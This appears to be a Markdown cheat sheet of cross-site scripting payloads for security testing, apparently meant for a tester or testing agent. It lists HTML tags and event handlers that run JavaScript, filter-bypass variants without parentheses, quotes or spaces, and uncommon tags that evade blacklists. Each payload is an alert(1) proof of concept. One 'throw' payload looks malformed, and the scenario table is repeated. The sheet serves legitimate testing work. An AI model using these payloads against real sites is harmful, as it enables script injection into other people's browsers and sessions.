# Alternative HTML Tags for XSS

## ⚠️ CRITICAL: How to Use This File

**This file contains PATTERNS to understand, NOT a list of payloads to throw.**

**Before using any tag:**
1. Check your character map — do you have `<` `>` `=` and required chars?
2. Filter out tags that use blocked characters
3. Understand WHY each tag works, then build YOUR payload
4. Test incrementally, not the full payload at once

**Stop Conditions:**
- After 3-4 encoding/obfuscation attempts on a tag fail → try different tag
- After 4-5 different tags fail → consider alternative execution methods (javascript: protocol)
- After exhausting tag-based approaches → document as heavily filtered, try other vectors

---

## Selection Criteria

Before selecting a tag, consider:
- **Do you have the required characters?** Most need `<` `>` `=`
- **Auto-fire or interaction?** Some execute automatically, others need user action
- **What's blocked?** Skip tags containing blocked characters/patterns

---

## Auto-Execution Tags (No User Interaction)

These execute JavaScript automatically when the page loads or the element is processed.

### Image with Invalid Source
```html
<img src=x onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src=invalid onerror=alert(1)>
```
**Requires:** `<` `>` `=` `(` `)`
**Blocked common filters:** `onerror` sometimes filtered

### SVG onload
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
```
**Requires:** `<` `>` `=` `(` `)`
**Note:** Self-closing works

### Body onload
```html
<body onload=alert(1)>
```
**Requires:** `<` `>` `=` `(` `)`
**Note:** May conflict with existing body tag

### Input with Autofocus
```html
<input autofocus onfocus=alert(1)>
<input onfocus=alert(1) autofocus>
```
**Requires:** `<` `>` `=` `(` `)` space
**Note:** Auto-focuses and triggers

### Details with Open
```html
<details open ontoggle=alert(1)>
<details ontoggle=alert(1) open>
```
**Requires:** `<` `>` `=` `(` `)` space

### Video/Audio Error
```html
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<video><source onerror=alert(1)>
```
**Requires:** `<` `>` `=` `(` `)`

### Marquee (Deprecated but works)
```html
<marquee onstart=alert(1)>
```
**Requires:** `<` `>` `=` `(` `)`

### Object Error
```html
<object data=x onerror=alert(1)>
```
**Requires:** `<` `>` `=` `(` `)`

### Embed (for javascript: URLs)
```html
<embed src=javascript:alert(1)>
```
**Requires:** `<` `>` `=` `:` `(` `)`

### Iframe with javascript:
```html
<iframe src=javascript:alert(1)>
```
**Requires:** `<` `>` `=` `:` `(` `)`

---

## User Interaction Required

These require some user action (click, hover, focus, etc.)

### Anchor with javascript:
```html
<a href=javascript:alert(1)>click</a>
```
**Requires:** `<` `>` `=` `:` `(` `)`
**Interaction:** Click required

### Mouseover Events
```html
<div onmouseover=alert(1)>hover here</div>
<span onmouseover=alert(1)>hover</span>
<img src=valid.jpg onmouseover=alert(1)>
```
**Requires:** `<` `>` `=` `(` `)`
**Interaction:** Mouse hover

### Click Events
```html
<div onclick=alert(1)>click</div>
<button onclick=alert(1)>click</button>
```
**Requires:** `<` `>` `=` `(` `)`
**Interaction:** Click

### Focus Events (Without autofocus)
```html
<input onfocus=alert(1)>
<select onfocus=alert(1)><option>x</option></select>
<textarea onfocus=alert(1)>
```
**Requires:** `<` `>` `=` `(` `)`
**Interaction:** Tab or click to focus

### Form Submit
```html
<form action=javascript:alert(1)><input type=submit>
```
**Requires:** `<` `>` `=` `:` `(` `)`
**Interaction:** Submit button click

---

## Tags Without Parentheses

If `(` and `)` are blocked:

### Using Template Literals
```html
<img src=x onerror=alert`1`>
<svg onload=alert`1`>
```
**Requires:** `<` `>` `=` `` ` ``

### Using throw with onerror
```html
<img src=x onerror=throw/a]alert;a=1>
```
**Note:** Complex, browser-dependent

### Location Assignment
```html
<img src=x onerror=location='javascript:alert%281%29'>
```
**Requires:** `<` `>` `=` `'` `:` `%`

---

## Tags Without Quotes

If `"` and `'` are blocked:

### Unquoted Attributes
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
**Note:** Works when no spaces in payload

### Using Backticks
```html
<img src=x onerror=alert`1`>
```

---

## Tags Without Spaces

If space is blocked:

### Using Forward Slash
```html
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>
```

### Using Tab or Newline
```html
<img%09src=x%09onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
```

---

## Less Common Tags (For Blacklist Bypass)

If common tags like `<script>`, `<img>`, `<svg>` are blocked:

```html
<math><brute href=javascript:alert(1)>click</brute></math>
<isindex action=javascript:alert(1) type=submit value=click>
<form><button formaction=javascript:alert(1)>click</button>
<xss onclick=alert(1)>click</xss>  <!-- Custom tags with events -->
<custom onmouseover=alert(1)>hover</custom>
```

### SVG-specific
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x>
```

### MathML
```html
<math href=javascript:alert(1)>click</math>
```

---

## Quick Selection Guide

| Scenario | Recommended Tags |
|----------|------------------|
| Need auto-fire | `<img onerror>`, `<svg onload>`, `<input autofocus onfocus>` |
| `<script>` blocked | Any of the above |
| `<img>` blocked | `<svg>`, `<body>`, `<input autofocus>`, `<details open>` |
| `<svg>` blocked | `<img>`, `<video>`, `<body>`, `<input autofocus>` |
| `on*` handlers blocked | `<a href=javascript:>`, `<iframe src=javascript:>` |
| `( )` blocked | Use template literals: `alert\`1\`` |
| Interaction OK | `<a href=javascript:>`, `<div onclick>`, `<div onmouseover>` |

---

## Selection by Scenario

| Scenario | Recommended Approach |
|----------|---------------------|
| Need auto-fire | `<img onerror>`, `<svg onload>`, `<input autofocus onfocus>` |
| `<script>` blocked | Use any tag with event handler |
| `<img>` blocked | `<svg>`, `<body>`, `<input autofocus>`, `<details open>` |
| `<svg>` blocked | `<img>`, `<video>`, `<body>`, `<input autofocus>` |
| `on*` handlers blocked | `<a href=javascript:>`, `<iframe src=javascript:>` |
| `( )` blocked | Template literals: `alert\`1\`` |
| User interaction OK | `<a href=javascript:>`, `<div onclick>`, `<div onmouseover>` |
